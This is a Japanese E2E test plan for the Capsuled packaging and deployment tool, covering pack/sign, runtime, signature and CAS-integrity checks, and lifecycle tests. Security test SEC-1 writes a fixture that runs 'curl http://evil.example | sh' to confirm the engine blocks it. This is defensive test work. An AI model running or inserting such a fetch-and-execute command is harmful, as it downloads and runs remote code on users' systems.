# Capsuled E2E Test Cases

UARC V1.1.0準拠の実装に対する包括的なE2Eテストケース一覧です。

## 概要

テストは以下の4カテゴリに分類されます：

1. **Supply Chain Tests (CLI)** - Pack & Sign機能
2. **Runtime Tests (Engine)** - デプロイ・実行機能
3. **Security Tests** - L1/L2検証機能
4. **Lifecycle Tests** - 安定性・ライフサイクル

---

## 1. Supply Chain Tests (CLI: Pack & Sign)

### S-1: Pack & CAS生成

**目的**: `capsule pack`が正しくCASアーティファクトを作成するか確認

**手順**:
```bash
cd /tmp && mkdir -p test-s1 && cd test-s1
echo 'print("Hello")' > main.py
cat > capsule.toml << 'EOF'
schema_version = "1.0"
name = "test-s1"
version = "0.1.0"
type = "app"

[execution]
runtime = "source"
entrypoint = "main.py"

[targets]
preference = ["source"]

[targets.source]
language = "python"
entrypoint = "main.py"
dev_mode = true
EOF

capsule pack
```

**期待結果**:
- `.capsule`ファイルが生成される
- マニフェストに`source_digest`(sha256)が追加される
- `~/.capsule/cas/blobs/`に対応するBlobが保存される

---

### S-2: 署名付きPack

**目的**: `capsule pack --key`で署名付きアーティファクトを生成

**手順**:
```bash
capsule keygen --name test-key
capsule pack --key ~/.capsule/keys/test-key.secret
```

**期待結果**:
- `.capsule`と共に`.sig`ファイルが生成される
- 署名ファイルサイズが100byte以上

---

### S-3: 除外設定 (.gitignore)

**目的**: .gitignoreに指定されたファイルがCASアーカイブに含まれないことを確認

**手順**:
```bash
echo "*.tmp" >> .gitignore
touch ignore_me.tmp
capsule pack

# アーカイブの中身確認
DIGEST=$(cat *.capsule | jq -r '.targets.source_digest')
HASH=${DIGEST#sha256:}
tar -tf ~/.capsule/cas/blobs/sha256-$HASH | grep "ignore_me.tmp"
```

**期待結果**:
- `ignore_me.tmp`がアーカイブに含まれていない

---

## 2. Runtime Tests (Engine: Deployment)

### R-1: Devモード実行 (Launcher)

**目的**: `capsule open --dev`でローカルソース実行を確認

**前提**: `CAPSULED_ALLOW_DEV_MODE=1`でEngine起動

**手順**:
```bash
# Web server app
cat > main.py << 'EOF'
from http.server import HTTPServer, BaseHTTPRequestHandler
import os
port = int(os.environ.get("PORT", "8080"))
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Hello from Capsule!')
httpd = HTTPServer(("0.0.0.0", port), H)
httpd.serve_forever()
EOF

capsule open --dev
```

**期待結果**:
- Engineがdev_mode=trueでリクエストを受信
- `capsule ps`でステータスが`running`
- `curl http://localhost:<PORT>`で応答を確認
- `capsule logs <id>`でリアルタイムログが見れる

---

### R-2: Prodモード実行 (CAS)

**目的**: `capsule open <.capsule>`でCAS経由デプロイを確認

**手順**:
```bash
capsule pack --key ~/.capsule/keys/test-key.secret
capsule open test.capsule
```

**期待結果**:
- EngineがCASからBlobをフェッチ
- `/tmp/capsuled/bundles/.../rootfs`に展開
- Engineログに`CAS archive fetched`と`Extracted archive`が出力

---

### R-3: ステータス確認

**目的**: `capsule ps`で実行中のカプセルを正しく表示

**手順**:
```bash
capsule open --dev &
sleep 3
capsule ps
```

**期待結果**:
- カプセルID、STATUS(`running`)が正しく表示される

---

### R-4: 正常停止

**目的**: `capsule close <id>`でプロセスを終了

**手順**:
```bash
capsule close <capsule-id>
capsule ps
```

**期待結果**:
- プロセスがSIGTERMで終了
- `capsule ps`から消える

---

## 3. Security Tests (Verification)

### SEC-1: L1危険コード検出

**目的**: `curl | sh`を含むスクリプトでデプロイ拒否を確認

**手順**:
```bash
cat > main.py << 'EOF'
import os
os.system("curl http://evil.example | sh")
EOF

capsule open --dev
```

**期待結果**:
- **デプロイ拒否**
- Engineログに`L1 Policy Violation: Obfuscation detected: | sh found`

---

### SEC-2: 署名改ざん検知

**目的**: .capsule改ざん時に署名検証が失敗することを確認

**前提**: `CAPSULED_ENFORCE_SIGNATURES=1`と`CAPSULED_PUBKEY`を設定

**手順**:
```bash
# 正規の署名付きカプセルを作成
capsule pack --key ~/.capsule/keys/test-key.secret

# .capsuleを改ざん（署名はそのまま）
python3 -c "
import json
with open('test.capsule', 'r') as f:
    data = json.load(f)
data['version'] = '9.9.9'
with open('test.capsule', 'w') as f:
    json.dump(data, f)
"

capsule open test.capsule
```

**期待結果**:
- **デプロイ拒否**
- Engineログに`Cryptographic verification failed: signature verification failed`

---

### SEC-3: Canonical Bytes検証

**目的**: JSONフォーマット変更後も署名検証が成功することを確認

**手順**:
```bash
capsule pack --key ~/.capsule/keys/test-key.secret
cat test.capsule | jq -S . > test-reformatted.capsule
cp test.sig test-reformatted.sig
capsule open test-reformatted.capsule
```

**期待結果**:
- **デプロイ成功**
- Canonical Cap'n Proto bytesにより意味が同じならハッシュが一致

---

### SEC-4: CAS整合性チェック

**目的**: CAS内Blobが改ざんされた場合に検出・拒否を確認

**手順**:
```bash
capsule pack --key ~/.capsule/keys/test-key.secret
DIGEST=$(cat *.capsule | jq -r '.targets.source_digest')
HASH=${DIGEST#sha256:}
echo "corruption" >> ~/.capsule/cas/blobs/sha256-$HASH

capsule open test.capsule
```

**期待結果**:
- **デプロイ拒否**
- Engineログに`Hash mismatch`エラー

---

### SEC-5: 署名なし実行拒否

**目的**: 署名強制時に.sigなしで実行が拒否されることを確認

**前提**: `CAPSULED_ENFORCE_SIGNATURES=1`でEngine起動

**手順**:
```bash
capsule pack  # 署名なし
capsule open test.capsule
```

**期待結果**:
- **デプロイ拒否**
- Engineログに`Security: signature is required but missing`

---

## 4. Lifecycle & Stability

### L-1: 長時間実行

**目的**: 60秒以上のプロセスが正常に動作することを確認

**手順**:
```bash
cat > main.py << 'EOF'
import time
for i in range(90):
    print(f"Running... {i}")
    time.sleep(1)
EOF

capsule open --dev
sleep 65
capsule ps
```

**期待結果**:
- プロセスが即死せず`capsule ps`で`running`が維持

---

### L-2: ログローテーション

**目的**: 大量ログ出力時にEngineがクラッシュしないことを確認

**手順**:
```bash
cat > main.py << 'EOF'
for i in range(1000):
    print(f"Log line {i} - padding padding padding")
EOF

capsule open --dev
sleep 5
capsule ps
```

**期待結果**:
- Engineがクラッシュせず安定動作

---

### L-3: 多重起動

**目的**: 同じカプセルの複数起動時の挙動を確認

**手順**:
```bash
capsule open test.capsule &
sleep 2
capsule open test.capsule &
sleep 2
capsule ps
```

**期待結果**:
- 現在の設計では同一IDは上書き動作（1つのインスタンス）

---

## ユーザーシナリオE2Eテスト

### シナリオ1: Python Web API (Development Flow)

**目的**: 開発フロー全体の検証

**手順**:
1. `capsule open --dev` で起動
2. `capsule ps` でステータス確認
3. `curl http://localhost:<PORT>` で動作確認
4. `capsule logs <id>` でログ確認
5. `capsule close <id>` で停止

**期待結果**: 全ステップが成功

---

### シナリオ2: バッチ処理 + CAS配布 (Production Flow)

**目的**: 本番配布フロー全体の検証

**手順**:
1. `capsule keygen --name production-key`
2. `capsule pack --key ~/.capsule/keys/production-key.secret`
3. Engine起動（署名強制ON）
4. `capsule open my-batch-job.capsule`
5. `capsule logs my-batch-job` で結果確認

**期待結果**: CAS経由でデプロイ成功、環境変数反映

---

### シナリオ3: サプライチェーン攻撃の防衛

**ケースA: L1危険コード検出**
- `| sh`パターン混入 → デプロイ拒否

**ケースB: L2署名改ざん検知**
- .capsule改ざん → `signature verification failed`

**ケースC: 署名なし実行拒否**
- .sig退避 → `signature is required but missing`

---

## 環境変数リファレンス

| 環境変数 | 説明 | デフォルト |
|---------|------|----------|
| `CAPSULED_ALLOW_DEV_MODE` | dev_modeを許可 | 無効 |
| `CAPSULED_PUBKEY` | 信頼する公開鍵（ed25519:base64形式） | なし |
| `CAPSULED_ENFORCE_SIGNATURES` | 署名を強制 | 無効 |

---

## テスト実行コマンド

```bash
# 全テスト実行
./scripts/e2e-test.sh

# 個別テスト実行
./scripts/e2e-test.sh --scenario 1
./scripts/e2e-test.sh --security-only
```
